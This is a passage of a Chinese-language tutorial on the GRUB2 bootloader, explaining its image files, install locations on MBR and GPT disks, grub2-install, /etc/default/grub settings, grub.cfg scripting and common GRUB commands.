&#x2F;usr&#x2F;lib&#x2F;grub&#x2F;i386-pc&#x2F;diskboot.img-rw-r--r--. 1 root root 28K Nov 24 2015 &#x2F;usr&#x2F;lib&#x2F;grub&#x2F;i386-pc&#x2F;kernel.img-rw-r--r--. 1 root root 1.0K Nov 24 2015 &#x2F;usr&#x2F;lib&#x2F;grub&#x2F;i386-pc&#x2F;lnxboot.img-rw-r--r--. 1 root root 2.9K Nov 24 2015 &#x2F;usr&#x2F;lib&#x2F;grub&#x2F;i386-pc&#x2F;lzma_decompress.img-rw-r--r--. 1 root root 1.0K Nov 24 2015 &#x2F;usr&#x2F;lib&#x2F;grub&#x2F;i386-pc&#x2F;pxeboot.img 1.5 boot loader和grub的关系当使用grub来管理启动菜单时，那么boot loader都是grub程序安装的。 传统的grub将stage1转换后的内容安装到MBR(VBR或EBR)中的boot loader部分，将stage1_5转换后的内容安装在紧跟在MBR后的扇区中，将stage2转换后的内容安装在/boot分区中。 grub2将boot.img转换后的内容安装到MBR(VBR或EBR)中的boot loader部分，将diskboot.img和kernel.img结合成为core.img，同时还会嵌入一些模块或加载模块的代码到core.img中，然后将core.img转换后的内容安装到磁盘的指定位置处。 它们之间更具体的关系见下文。 1.6 grub2的安装位置官方手册原文：https://www.gnu.org/software/grub/manual/html_node/BIOS-installation.html#BIOS-installation 严格地说是core.img的安装位置，因为boot.img的位置是固定在MBR或VBR或EBR上的。 (1).MBR MBR格式的分区表用于PC BIOS平台，这种格式允许四个主分区和额外的逻辑分区。使用这种格式的分区表，有两种方式安装GURB： 嵌入到MBR和第一个分区中间的空间，这部分就是大众所称的”boot track”,”MBR gap”或”embedding area”，它们大致需要31kB的空间； 将core.img安装到某个文件系统中，然后使用分区的第一个扇区(严格地说不是第一个扇区，而是第一个block)存储启动它的代码。 这两种方法有不同的问题。 使用嵌入的方式安装grub，就没有保留的空闲空间来保证安全性，例如有些专门的软件就是使用这段空间来实现许可限制的；另外分区的时候，虽然会在MBR和第一个分区中间留下空闲空间，但可能留下的空间会比这更小。 方法二安装grub到文件系统，但这样的grub是脆弱的。例如，文件系统的某些特性需要做尾部包装，甚至某些fsck检测，它们可能会移动这些block。 GRUB开发团队建议将GRUB嵌入到MBR和第一个分区之间，除非有特殊需求，但仍必须要保证第一个分区至少是从第31kB(第63个扇区)之后才开始创建的。 现在的磁盘设备，一般都会有分区边界对齐的性能优化提醒，所以第一个分区可能会自动从第1MB处开始创建。 (2).GPT 一些新的系统使用GUID分区表(GPT)格式，这种格式是EFI固件所指定的一部分。但如果操作系统支持的话，GPT也可以用于BIOS平台(即MBR风格结合GPT格式的磁盘)，使用这种格式，需要使用独立的BIOS boot分区来保存GRUB，GRUB被嵌入到此分区，不会有任何风险。 当在gpt磁盘上创建一个BIOS boot分区时，需要保证两件事：(1)它最小是31kB大小，但一般都会为此分区划分1MB的空间用于可扩展性；(2)必须要有合理的分区类型标识(flag type)。 例如使用gun parted工具时，可以设置为bios_grub标识： 1# parted &#x2F;dev&#x2F;sda toggle partition_num bios_grub&#96;&#96;# parted &#x2F;dev&#x2F;sda set partiton_num bios_grub on 如果使用gdisk分区工具时，则分类类型设置为”EF02”。 如果使用其他的分区工具，可能需要指定guid，则可以指定其guid为”21686148-6449-6e6f-744e656564454649”。 下图是某个bios/gpt格式的bios boot分区信息，从中可见，它大小为1M，没有文件系统，分区表示为bios_grub。 下图为gpt磁盘在图形界面下安装操作系统时创建的Bios boot分区。 1.7 进入grub命令行在传统的grub上，可以直接在bash下敲入grub命令进入命令交互模式，但grub2只能在系统启动前进入grub交互命令行。 按下e见可以编辑所选菜单对应的grub菜单配置项，按下c键可以进入grub命令行交互模式。 2 安装grub2官方手册原文：https://www.gnu.org/software/grub/manual/html_node/Installing-GRUB-using-grub_002dinstall.html#Installing-GRUB-using-grub_002dinstall 这里的安装指的不是安装grub程序，而是安装Boot loader，但一般都称之为安装grub，且后文都是这个意思。 2.1 grub安装命令安装方式非常简单，只需调用grub2-install，然后给定安装到的设备名即可。 1shell&gt; grub2-install &#x2F;dev&#x2F;sda 这样的安装方式，默认会将img文件放入到/boot目录下，如果想自定义放置位置，则使用–boot-directory选项指定，可用于测试练习grub的时候使用，但在真实的grub环境下不建议做任何改动。 1shell&gt; grub2-install --boot-director&#x3D;&#x2F;mnt&#x2F;boot &#x2F;dev&#x2F;fd0 如果是EFI固件平台，则必须挂载好efi系统分区，一般会挂在/boot/efi下，这是默认的，此时可直接使用grub2-install安装。 1shell&gt; grub2-install 如果不是挂载在/boot/efi下，则使用–efi-directory指定efi系统分区路径。 1shell&gt; grub2-install --efi-directory&#x3D;&#x2F;mnt&#x2F;efi grub2-install实际上是一个shell脚本，用于调用其他工具，真正的功能都是其他工具去完成的，所以如果非常熟悉grub内部命令和机制，完全可以不用grub2-install。 对应传统的grub安装命令为grub-install，用法和grub2-install一样。 2.2 各种img和stage文件的说明官方手册原文：https://www.gnu.org/software/grub/manual/html_node/Images.html#Images img文件是grub2生成的，stage文件是传统grub生成的。下面是各种文件的说明。 2.2.1 grub2中的img文件grub2生成了好几个img文件，有些分布在/usr/lib/grub/i386-pc目录下，有些分布在/boot/grub2/i386-pc目录下，它们之间的关系，相信看了下文之后就会明白了。 下图描述了各个img文件之间的关系。其中core.img是动态生成的，路径为/boot/grub2/i386-pc/core.img，而其他的img则存在于/usr/lib/grub/i386-pc目录下。当然，在安装grub时，boot.img会被拷贝到/boot/grub2/i386-pc目录下。 (1)boot.img 在BIOS平台下，boot.img是grub启动的第一个img文件，它被写入到MBR中或分区的boot sector中，因为boot sector的大小是512字节，所以该img文件的大小也是512字节。 boot.img唯一的作用是读取属于core.img的第一个扇区并跳转到它身上，将控制权交给该扇区的img。由于体积大小的限制，boot.img无法理解文件系统的结构，因此grub2-install将会把core.img的位置硬编码到boot.img中，这样就一定能找到core.img的位置。 (2)core.img core.img根据diskboot.img、kernel.img和一系列的模块被grub2-mkimage程序动态创建。core.img中嵌入了足够多的功能模块以保证grub能访问/boot/grub，并且可以加载相关的模块实现相关的功能，例如加载启动菜单、加载目标操作系统的信息等，由于grub2大量使用了动态功能模块，使得core.img体积变得足够小。 core.img中包含了多个img文件的内容，包括diskboot.img/kernel.img等。 core.img的安装位置随MBR磁盘和GPT磁盘而不同，这在上文中已经说明过了。 (3)diskboot.img 如果启动设备是硬盘，即从硬盘启动时，core.img中的第一个扇区的内容就是diskboot.img。diskboo.img的作用是读取core.img中剩余的部分到内存中，并将控制权交给kernel.img，由于此时还不识别文件系统，所以将core.img的全部位置以block列表的方式编码，使得diskboot.img能够找到剩余的内容。 该img文件因为占用一个扇区，所以体积为512字节。 (4)cdboot.img 如果启动设备是光驱(cd-rom)，即从光驱启动时，core.img中的第一个扇区的的内容就是cdboo.img。它的作用和diskboot.img是一样的。 (5)pexboot.img 如果是从网络的PXE环境启动，core.img中的第一个扇区的内容就是pxeboot.img。 (6)kernel.img kernel.img文件包含了grub的基本运行时环境：设备框架、文件句柄、环境变量、救援模式下的命令行解析器等等。很少直接使用它，因为它们已经整个嵌入到了core.img中了。注意，kernel.img是grub的kernel，和操作系统的内核无关。 如果细心的话，会发现kernel.img本身就占用28KB空间，但嵌入到了core.img中后，core.img文件才只有26KB大小。这是因为core.img中的kernel.img是被压缩过的。 (7)lnxboot.img 该img文件放在core.img的最前部位，使得grub像是linux的内核一样，这样core.img就可以被LILO的”image=”识别。当然，这是配合LILO来使用的，但现在谁还适用LILO呢？ (8)*.mod 各种功能模块，部分模块已经嵌入到core.img中，或者会被grub自动加载，但有时也需要使用insmod命令手动加载。 2.2.2 传统grub中的stage文件grub2的设计方式和传统grub大不相同，因此和stage之间的对比关系其实没那么标准，但是将它们拿来比较也有助于理解img和stage文件的作用。 stage文件也分布在两个地方：/usr/share/grub/RELEASE目录下和/boot/grub目录下，/boot/grub目录下的stage文件是安装grub时从/usr/share/grub/RELEASE目录下拷贝过来的。 (1)stage1 stage1文件在功能上等价于boot.img文件。目的是跳转到stage1_5或stage2的第一个扇区上。 (2)*_stage1_5 *stage1_5文件包含了各种识别文件系统的代码，使得grub可以从文件系统中读取体积更大功能更复杂的stage2文件。从这一方面考虑，它类似于core.img中加载对应文件系统模块的代码部分，但是core.img的功能远比stage1_5多。 stage1_5一般安装在MBR后、第一个分区前的那段空闲空间中，也就是MBR gap空间，它的作用是跳转到stage2的第一个扇区。 其实传统的grub在某些环境下是可以不用stage1_5文件就能正常运行的，但是grub2则不能缺少core.img。 (3)stage2 stage2的作用是加载各种环境和加载内核，在grub2中没有完全与之相对应的img文件，但是core.img中包含了stage2的所有功能。 当跳转到stage2的第一个扇区后，该扇区的代码负责加载stage2剩余的内容。 注意，stage2是存放在磁盘上的，并没有像core.img一样嵌入到磁盘上。 (4)stage2_eltorito 功能上等价于grub2中的core.img中的cdboot.img部分。一般在制作救援模式的grub时才会使用到cd-rom相关文件。 (5)pxegrub 功能上等价于grub2中的core.img中的pxeboot.img部分。 2.3 安装grub涉及的过程安装grub2的过程大体分两步：一是根据/usr/lib/grub/i386-pc/目录下的文件生成core.img，并拷贝boot.img和core.img涉及的某些模块文件到/boot/grub2/i386-pc/目录下；二是根据/boot/grub2/i386-pc目录下的文件向磁盘上写boot loader。 当然，到底是先拷贝，还是先写boot loader，没必要去搞清楚，只要/boot/grub2/i386-pc下的img文件一定能通过grub2相关程序再次生成boot loader。所以，既可以认为/boot/grub2/i386-pc目录下的img文件是boot loader的特殊备份文件，也可以认为是boot loader的源文件。 不过，img文件和boot loader的内容是不一致的，因为img文件还要通过grub2相关程序来转换才是真正的boot loader。 对于传统的grub而言，拷贝的不是img文件，而是stage文件。 以下是安装传统grub时，grub做的工作。很不幸，grub2上没有该命令，也没有与之等价的命令。 12345678grub&gt; setup (hd0) Checking if &quot;&#x2F;boot&#x2F;grub&#x2F;stage1&quot; exists... yes Checking if &quot;&#x2F;boot&#x2F;grub&#x2F;stage2&quot; exists... yes Checking if &quot;&#x2F;boot&#x2F;grub&#x2F;e2fs_stage1_5&quot; exists... yes Running &quot;embed &#x2F;boot&#x2F;grub&#x2F;e2fs_stage1_5 (hd0)&quot;... 15 sectors are embedded.succeeded Running &quot;install &#x2F;boot&#x2F;grub&#x2F;stage1 (hd0) (hd0)1+15 p (hd0,0)&#x2F;boot&#x2F;grub&#x2F;stage2 &#x2F;boot&#x2F;grub&#x2F;menu.lst&quot;... succeededDone. 首先检测各stage文件是否存在于/boot/grub目录下，随后嵌入stage1_5到磁盘上，该文件系统类型的stage1_5占用了15个扇区，最后安装stage1，并告知stage1 stage1_5的位置是第1到第15个扇区，之所以先嵌入stage1_5再嵌入stage1就是为了让stage1知道stage1_5的位置，最后还告知了stage1 stage2和配置文件menu.lst的路径。 3 grub2配置文件grub2的默认配置文件为/boot/grub2/grub.cfg，该配置文件的写法弹性非常大，但绝大多数需要修改该配置文件时，都只需修改其中一小部分内容就可以达成目标。 grub2-mkconfig程序可用来生成符合绝大多数情况的grub.cfg文件，默认它会自动尝试探测有效的操作系统内核，并生成对应的操作系统菜单项。使用方法非常简单，只需一个选项”-o”指定输出文件即可。 1shell&gt; grub2-mkconfig -o &#x2F;boot&#x2F;grub2&#x2F;grub.cfg 3.1 通过/etc/default/grub文件生成grub.cfg官方手册原文：https://www.gnu.org/software/grub/manual/html_node/Simple-configuration.html#Simple-configuration grub2-mkconfig是根据/etc/default/grub文件来创建配置文件的。该文件中定义的是grub的全局宏，修改内置的宏可以快速生成grub配置文件。实际上在/etc/grub.d/目录下还有一些grub配置脚本，这些shell脚本读取一些脚本配置文件(如/etc/default/grub)，根据指定的逻辑生成grub配置文件。若有兴趣，不放读一读/etc/grub.d/10_linux文件，它指导了创建grub.cfg的细节，例如如何生成启动菜单。 12[root@xuexi ~]# ls &#x2F;etc&#x2F;grub.d&#x2F;00_header 00_tuned 01_users 10_linux 20_linux_xen 20_ppc_terminfo 30_os-prober 40_custom 41_custom README 在/etc/default/grub中，使用”key=vaule”的格式，key全部为大小字母，如果vaule部分包含了空格或其他特殊字符，则需要使用引号包围。 例如，下面是一个/etc/default/grub文件的示例： 12345678[root@xuexi ~]# cat &#x2F;etc&#x2F;default&#x2F;grubGRUB_TIMEOUT&#x3D;5GRUB_DISTRIBUTOR&#x3D;&quot;$(sed &#39;s, release .*$,,g&#39; &#x2F;etc&#x2F;system-release)&quot;GRUB_DEFAULT&#x3D;savedGRUB_DISABLE_SUBMENU&#x3D;trueGRUB_TERMINAL_OUTPUT&#x3D;&quot;console&quot;GRUB_CMDLINE_LINUX&#x3D;&quot;crashkernel&#x3D;auto biosdevname&#x3D;0 net.ifnames&#x3D;0 rhgb quiet&quot;GRUB_DISABLE_RECOVERY&#x3D;&quot;true&quot; 虽然可用的宏较多，但可能用的上的就几个：GRUB_DEFAULT、GRUB_TIMEOUT、GRUB_CMDLINE_LINUX和GRUB_CMDLINE_LINUX_DEFAULT。 以下列出了部分key。 (1).GRUB_DEFAULT 默认的菜单项，默认值为0。其值可为数值N，表示从0开始计算的第N项是默认菜单，也可以指定对应的title表示该项为默认的菜单项。使用数值比较好，因为使用的title可能包含了容易改变的设备名。例如有如下菜单项： 1menuentry &#96;&#96;&#39;Example GNU&#x2F;Linux distribution&#39;&#96; &#96;--class gnu-linux --&#96;&#96;id&#96; &#96;example-gnu-linux &#123;&#96;&#96; &#96;&#96;...&#96;&#96;&#125; 如果想将此菜单设为默认菜单，则可设置”GRUB_DEFAULT=example-gnu-linux”。 如果GRUB_DEFAULT的值设置为”saved”，则表示默认的菜单项是”GRUB_SAVEDEFAULT”或”grub-set-default”所指定的菜单项。 (2).GRUB_SAVEDEFAULT 默认该key的值未设置。如果该key的值设置为true时，如果选定了某菜单项，则该菜单项将被认为是新的默认菜单项。该key只有在设置了”GRUB_DEFAULT=saved”时才有效。 不建议使用该key，因为GRUB_DEFAULT配合grub-set-default更方便。 (3).GRUB_TIMEOUT 在开机选择菜单项的超时时间，超过该时间将使用默认的菜单项来引导对应的操作系统。默认值为5秒。等待过程中，按下任意按键都可以中断等待。 设置为0时，将不列出菜单直接使用默认的菜单项引导与之对应的操作系统，设置为”-1”时将永久等待选择。 是否显示菜单，和”GRUB_TIMEOUT_STYLE”的设置有关。 (4).GRUB_TIMEOUT_STYLE 如果该key未设置值或者设置的值为”menu”，则列出启动菜单项，并等待”GRUB_TIMEOUT”指定的超时时间。 如果设置为”countdown”和”hidden”，则不显示启动菜单项，而是直接等待”GRUB_TIMEOUT”指定的超时时间，如果超时了则启动默认菜单项并引导对应的操作系统。在等待过程中，按下”ESC”键可以列出启动菜单。设置为countdown和hidden的区别是countdown会显示超时时间的剩余时间，而hidden则完全隐藏超时时间。 (5).GRUB_DISTRIBUTOR 设置发行版的标识名称，一般该名称用来作为菜单的一部分，以便区分不同的操作系统。 (6).GRUB_CMDLINE_LINUX 添加到菜单中的内核启动参数。例如： GRUB_CMDLINE_LINUX=”crashkernel=ro root=/dev/sda3 biosdevname=0 net.ifnames=0 rhgb quiet” (7).GRUB_CMDLINE_LINUX_DEFAULT 除非”GRUB_DISABLE_RECOVERY”设置为”true”，否则该key指定的默认内核启动参数将生成两份，一份是用于默认启动参数，一份用于恢复模式(recovery mode)的启动参数。 该key生成的默认内核启动参数将添加在”GRUB_CMDLINE_LINUX”所指定的启动参数之后。 (8).GRUB_DISABLE_RECOVERY 该项设置为true时，将不会生成恢复模式的菜单项。 (9).GRUB_DISABLE_LINUX_UUID 默认情况下，grub2-mkconfig在生产菜单项的时候将使用uuid来标识Linux 内核的根文件系统，即”root=UUID=…”。 例如，下面是/boot/grub2/grub.cfg中某菜单项的部分内容。 menuentry ‘CentOS Linux (3.10.0-327.el7.x86_64) 7 (Core)’ –class centos –class gnu-linux –class gnu –class os –unrestricted $menuentry_id_option ‘gnulinux-3.10.0-327.el7.x86_64-advanced-b2a70faf-aea4-4d8e-8be8-c7109ac9c8b8’ { ​ …… ​ linux16 /vmlinuz-3.10.0-327.el7.x86_64 root=UUID=b2a70faf-aea4-4d8e-8be8-c7109ac9c8b8 ro crashkernel=auto biosdevname=0 net.ifnames=0 quiet LANG=en_US.UTF-8 ​ initrd16 /initramfs-3.10.0-327.el7.x86_64.img } 虽然使用UUID的方式更可靠，但有时候不太方便，所以可以设置该key为true来禁用。 (10).GRUB_BACKGROUND 设置背景图片，背景图片必须是grub可读的，图片文件名后缀必须是”.png”、”.tga”、”.jpg”、”.jpeg”，在需要的时候，grub会按比例缩小图片的大小以适配屏幕大小。 (11).GRUB_THEME 设置grub菜单的主题。 (12).GRUB_GFXPAYLOAD_LINUX 设置为”text”时，将强制使用文本模式启动Linux。在某些情况下，可能不支持图形模式。 (13).GRUB_DISABLE_OS_PROBER 默认情况下，grub2-mkconfig会尝试使用os-prober程序(如果已经安装的话，默认应该都装了)探测其他可用的操作系统内核，并为其生成对应的启动菜单项。设置为”true”将禁用自动探测功能。 (14).GRUB_DISABLE_SUBMENU 默认情况下，grub2-mkconfig如果发现有多个同版本的或低版本的内核时，将只为最高版本的内核生成顶级菜单，其他所有的低版本内核菜单都放入子菜单中，设置为”y”将全部生成为顶级菜单。 (15).GRUB_HIDDEN_TIMEOUT(已废弃，但为了向后兼容，仍有效) 使用”GRUB_TIMEOUT_STYLE={countdown|hidden}”替代该项 (16).GRUB_HIDDEN_TIMEOUT_QUIET(已废弃，但为了向后兼容，仍有效) 配合GRUB_HIDDEN_TIMEOUT使用，可以使用GRUB_TIMEOUT_STYLE=countdown来替代这两项。 3.2 脚本方式直接编写grub.cfg文件官方手册原文：https://www.gnu.org/software/grub/manual/html_node/Shell_002dlike-scripting.html#Shell_002dlike-scripting 注释符：从#开始的字符都被认为是注释，所以grub支持行中注释 连接操作符：{ } | &amp; $ ; &lt; &gt; 保留关键字和符号：! [[ ]] { } case do done elif else esac fi for function if in menuentry select then time until while。并非所有的关键字都有用，只是为了日后的功能扩展而提前提供的。 引号和转义符 对于特殊的字符需要转义。有三种方式转义：使用反斜线、使用单引号、使用双引号。 反斜线转义方式和shell一样。 单引号中的所有字符串都是字面意思，没有任何特殊意义，即使单引号中的转义符也被认为是纯粹的字符。所以’&#39;‘是无法保留单引号的。单引号需要使用双引号来转移，所以应该写”‘“。 双引号和单引号作用一样，但它不能转义某几个特殊字符，包括”$”和”&quot;。对于双引号中的”$”符号，它任何时候都保留本意。对于”&quot;，只有反斜线后的字符是’$’、’”‘、’&#39;时才表示转义的意思，另外 ，某行若以反斜线结尾，则表示续行，但官方不建议在grub.cfg中使用续行符。 变量扩展 使用$符号引用变量，也可以使用${var}的方式引用var变量。 支持位置变量，例如$1引用的是第一个参数。 还支持特殊的变量，如$?表示上一次命令的退出状态码。如果使用了位置变量，则还支持$、$@和$#，$代表的所有参数整体，各参数之间是不可分割的，$@也代表所有变量，但$@的各参数是可以被分割的，$#表示参数的个数。 简单的命令 可以在grub.cfg中使用简单的命令。各命令之间使用换行符或分号表示该命令结束。 如果在命令前使用了”!”，则表示逻辑取反。 循环结构：for name in word …; do list; done 循环结构：while cond; do list; done 循环结构：until cond; do list; done 条件判断结构：if list; then list; [elif list; then list;] … [else list;] fi 函数结构：function name { command; … } 菜单项命令：menuentry title [–class=class …] [–users=users] [–unrestricted] [–hotkey=key] [–id=id] { command; … } 这是grub.cfg中最重要的项，官方原文：https://www.gnu.org/software/grub/manual/html_node/menuentry.html#menuentry 该命令定义了一个名为title的grub菜单项。当开机时选中该菜单项时，grub会将chosen环境变量的值赋给”–id”(如果给定了”–id”的话)，执行大括号中的命令列表，如果直到最后一个命令都全部执行成功，且成功加载了对应的内核后，将执行boot命令。随后grub就将控制权交给了操作系统内核。 –class：该选项用于将菜单分组，从而使得grub可以通过主题样式为不同组的菜单显示不同的样式风格。一个menuentry中，可以使用多次class表示将该菜单分到多个组中去。 –users：该选项限定只有此处列出的用户才能访问该菜单项，不指定该选项时将表示所有用户都能访问该菜单。 –unrestricted：该选项表示所有用户都有权访问该菜单项。 –hotkey：该选项为该菜单项关联一个热键，也就是快捷键，关联热键后只要按下该键就会选中该菜单。热键只能是字母键、backspace键、tab键或del键。 –id：该选项为该菜单关联一个唯一的数值。id的值可以由ASCII字母、数字//下划线组成，且不得以数字开头。 所有其他的参数包括title都被当作位置参数传递给大括号中的命令，但title总是$1，除title外的其余参数，位置值从前向后类推。 break [n]：强制退出for/while/until循环 continue [n]：跳到下一次迭代，即进入下一次循环 return [n]：指定返回状态码 setparams [arg] …：从$1开始替换位置参数 shift [n]：踢掉前n个参数，使得第n+1个参数变为$1，但和shell中不一样的是，踢掉了前n个参数后，从$#-n+1到$#这些参数的位置不变 具体如何编写grub.cfg文件，继续看下文的命令和变量。 4 命令行和菜单项中的命令官方手册原文：https://www.gnu.org/software/grub/manual/html_node/Commands.html#Commands grub2支持很多命令，有些命令只能在交互式命令行下使用，有些命令可用在配置文件中。在救援模式下，只有insmod、ls、set和unset命令可用。 无需掌握所有的命令，掌握用的上的几个命令即可。 4.1 help命令1help [pattern] 显示能匹配到pattern的所有命令的说明信息和usage信息，如果不指定patttern，将显示所有命令的简短信息。 例如”help cmos”。 4.2 boot命令用于启动已加载的操作系统。 只在交互式命令行下可用。其实在menuentry命令的结尾就隐含了boot命令。 4.3 set和unset命令1set&#96; &#96;[envvar&#x3D;value]&#96;&#96;unset&#96; &#96;envvar 前者设置环境变量envvar的值，如果不给定参数，则列出当前环境变量。 后者释放环境变量envvar。 4.4 lsmod命令和insmod命令分别用于列出已加载的模块和调用指定的模块。 注意，若要导入支持ext文件系统的模块时，只需导入ext2.mod即可，实际上也没有ext3和ext4对应的模块。 4.5 linux和linux16命令1linux &#96;&#96;file&#96; &#96;[kernel_args]&#96;&#96;linux16 &#96;&#96;file&#96; &#96;[kernel_args] 都表示装载指定的内核文件，并传递内核启动参数。linux16表示以传统的16位启动协议启动内核，linux表示以32位启动协议启动内核，但linux命令比linux16有一些限制。但绝大多数时候，它们是可以通用的。 在linux或linux16命令之后，必须紧跟着使用init或init16命令装载init ramdisk文件。 一般为/boot分区下的vmlinuz-RELEASE_NUM文件。 但在grub环境下，boot分区被当作root分区，即根分区，假如boot分区为第一块磁盘的第一个分区，则应该写成： linux (hd0,msdos1)/vmlinuz-XXX 或者相对路径的： set root=’hd0,msdos1’ linux /vmlinuz-XXX 在grub阶段可以传递内核的启动参数(内核的参数包括3类：编译内核时参数，启动时参数和运行时参数)，可以传递的启动参数非常非常多，完整的启动参数列表见：http://redsymbol.net/linux-kernel-boot-parameters。这里只列出几个常用的： 123456789init&#x3D; ：指定Linux启动的第一个进程init的替代程序。root&#x3D; ：指定根文件系统所在分区，在grub中，该选项必须给定。ro,rw ：启动时，根分区以只读还是可读写方式挂载。不指定时默认为ro。initrd ：指定init ramdisk的路径。在grub中因为使用了initrd或initrd16命令，所以不需要指定该启动参数。rhgb ：以图形界面方式启动系统。quiet ：以文本方式启动系统，且禁止输出大多数的log message。net.ifnames&#x3D;0：用于CentOS 7，禁止网络设备使用一致性命名方式。biosdevname&#x3D;0：用于CentOS 7，也是禁止网络设备采用一致性命名方式。 ：只有net.ifnames和biosdevname同时设置为0时，才能完全禁止一致性命名，得到eth0-N的设备名。 例如： linux16 /vmlinuz-3.10.0-327.el7.x86_64 root=UUID=edb1bf15-9590-4195-aa11-6dac45c7f6f3 ro rhgb quiet LANG=en_US.UTF-8 另外，root启动参数有多种定义方式，可以使用UUID的方式指定，也可以直接指定根文件系统所在分区，如”root=/dev/sda2”， 4.6 initrd和initrd16命令1initrd &#96;&#96;file 只能紧跟在linux或linux16命令之后使用，用于为即将启动的内核传递init ramdisk路径。 同样，基于根分区，可以使用绝对路径，也可以使用相对路径。路径的表示方法和linux或linux16命令相同。例如： linux16 /vmlinuz-0-rescue-d13bce5e247540a5b5886f2bf8aabb35 root=UUID=b2a70faf-aea4-4d8e-8be8-c7109ac9c8b8 ro crashkernel=auto quiet initrd16 /initramfs-0-rescue-d13bce5e247540a5b5886f2bf8aabb35.img 4.7 search命令1search [--&#96;&#96;file&#96;&#96;|--label|--fs-uuid] [--&#96;&#96;set&#96; &#96;[var]] [--no-floppy] [--hint args] name 通过文件[–file]、卷标[–label]、文件系统UUID[–fs-uuid]来搜索设备。 如果使用了”–set”选项，则会将第一个找到的设备设置为环境变量”var”的值，默认的变量”var”为’root’。 搜索时可使用”–no-floppy”选项来禁止搜索软盘，因为软盘速度非常慢，已经被淘汰了。 有时候还会指定”–hint=XXX”，表示优先选择满足提示条件的设备，若指定了多个hint条件，则优先匹配第一个hint，然后匹配第二个，依次类推。 例如： if [ x$feature_platform_search_hint = xy ]; then search –no-floppy –fs-uuid –set=root –hint-bios=hd0,msdos1 –hint-efi=hd0,msdos1 –hint-baremetal=ahci0,msdos1 –hint=’hd0,msdos1’ 367d6a77-033b-4037-bbcb-416705ead095 else search –no-floppy –fs-uuid –set=root 367d6a77-033b-4037-bbcb-416705ead095 fi linux16 /vmlinuz-3.10.0-327.el7.x86_64 root=UUID=b2a70faf-aea4-4d8e-8be8-c7109ac9c8b8 ro crashkernel=auto quiet LANG=en_US.UTF-8 initrd16 /initramfs-3.10.0-327.el7.x86_64.img 上述if语句中的第一个search中搜索uuid为”367d6a77-033b-4037-bbcb-416705ead095”的设备，但使用了多个hint选项，表示先匹配bios平台下/boot分区为(hd0,msdos1)的设备，之后还指定了几个hint，但因为search使用的是uuid搜索方式，所以这些hint选项是多余的，因为单磁盘上分区的uuid是唯一的。 再举个例子，如果某启动设备上有两个boot分区(如多系统共存时)，分别是(hd0,msdos1)和(hd0,msdos5)，如果此时不使用uuid搜索，而是使用label方式搜索: search –no-floppy –fs-label=boot –set=root –hint=hd0,msdos5 则此时将会选中(hd0,msdos5)这个boot分区，若不使用hint，将选中(hd0,msdos1)这个boot分区。 4.8 true和false命令直接返回true或false布尔值。 4.9 test expression和[ expression ]计算”expression”的结果是否为真，为真时返回0，否则返回非0，主要用于if、while或until结构中。 string1 == string2 string1与string2相同 string1 != string2 string1与string2不相同 string1 &lt; string2 string1在字母顺序上小于string2 string1 &lt;= string2 string1在字母顺序上小于等于string2 string1 &gt; string2 string1在字母顺序上大于string2 string1 &gt;= string2 string1在字母顺序上大于等于string2 integer1 -eq integer2 integer1等于integer2 integer1 -ge integer2 integer1大于或等于integer2 integer1 -gt integer2 integer1大于integer2 integer1 -le integer2 integer1小于或等于integer2 integer1 -lt integer2 integer1小于integer2 integer1 -ne integer2 integer1不等于integer2 prefixinteger1 -pgt prefixinteger2 剔除非数字字符串prefix部分之后，integer1大于integer2 prefixinteger1 -plt prefixinteger2 剔除非数字字符串prefix部分之后，integer1小于integer2 file1 -nt file2 file1的修改时间比file2新 file1 -ot file2 file1的修改时间比file2旧 -d file file存在且是目录 -e file file存在 -f file file存在并且不是一个目录 -s file file存在并且文件占用空间大于零 -n string string的长度大于零 string string的长度大于零，等价于-n string -z string string的长度等于零 ( expression ) 将expression作为一个整体 ! expression 非(NOT) expression1 -a expression2 与(AND)，也可以使用expression1 expression2，但不推荐 expression1 -o expression2 或(OR) 4.10 cat命令读取文件内容，借此可以帮助判断哪个是boot分区，哪个是根分区。 交互式命令行下使用。 4.11 clear命令清屏。 4.12 configfile命令立即装载一个指定的文件作为grub的配置文件。但注意，导入的文件中的环境变量不在当前生效。 在grub.cfg丢失时，该命令将排上用场。 4.13 echo命令1echo&#96; &#96;[-n] [-e] string “-n”和”-e”用法同shell中echo。如果要引用变量，使用${var}的方式。 4.14 export命令导出环境变量，若在configfile的file中导出环境变量，将会在当前环境也生效。 4.15 halt和reboot命令关机或重启 4.16 ls命令1ls&#96; &#96;[args] 如果不给定任何参数，则列出grub可见的设备。 如果给定的参数是一个分区，则显示该分区的文件系统信息。 如果给定的参数是一个绝对路径表示的目录，则显示该目录下的所有文件。 例如： 4.17 probe命令1probe [--&#96;&#96;set&#96; &#96;var] --partmap|--fs|--fs-uuid|--label device 探测分区或磁盘的属性信息。如果未指定–set，则显示指定设备对应的信息。如果指定了–set，则将对应信息的值赋给变量var。 –partmap：显示是gpt还是mbr格式的磁盘。 –fs：显示分区的文件系统。 –fs-uuid：显示分区的uuid值。 –label：显示分区的label值。 4.18 save_env和list_env命令将环境变量保存到环境变量块中，以及列出当前的环境变量块中的变量。 4.19 loopback命令1loopback [-d] device &#96;&#96;file 将file映射为回环设备。使用-d选项则是删除映射。 例如： 12loopback loop0 &#x2F;path&#x2F;to&#x2F;imagels (loop0)&#x2F; 4.20 normal和normal_exit命令进入和退出normal模式，normal是相对于救援模式而言的，只要不是在救援模式下，就是在normal模式下。 救援模式下，只能使用非常少的命令，而normal模式下则可以使用非常多的命令。 4.21 password和password_pbkdf2命令1password user &#96;&#96;clear&#96;&#96;-password&#96;&#96;password_pbkdf2 user hashed-password 前者使用明文密码定义一个名为user的用户。不建议使用此命令。 后者使用哈希加密后的密码定义一个名为user的用户，加密的密码通过”grub-mkpasswd-pbkdf2”工具生成。建议使用该命令。 5 几个常设置的内置变量5.1 chosen变量当开机时选中某个菜单项启动时，该菜单的title将被赋值给chosen变量。该变量一般只用于引用，而不用于修改。 5.2 cmdpath变量grub2加载的core.img的目录路径，是绝对路径，即包括了设备名的路径，如(hd0,gpt1)/boot/grub2/。该变量值不应该修改。 5.3 default变量指定默认的菜单项，一般其后都会跟随timeout变量。 default指定默认菜单时，可使用菜单的title，也可以使用菜单的id，或者数值顺序，当使用数值顺序指定default时，从0开始计算。 5.4 timeout变量设置菜单等待超时时间，设置为0时将直接启动默认菜单项而不显示菜单，设置为”-1”时将永久等待手动选择。 5.5 fallback变量当默认菜单项启动失败，则使用该变量指定的菜单项启动，指定方式同default，可使用数值(从0开始计算)、title或id指定。 5.6 grub_platform变量指定该平台是”pc”还是”efi”，pc表示的就是传统的bios平台。 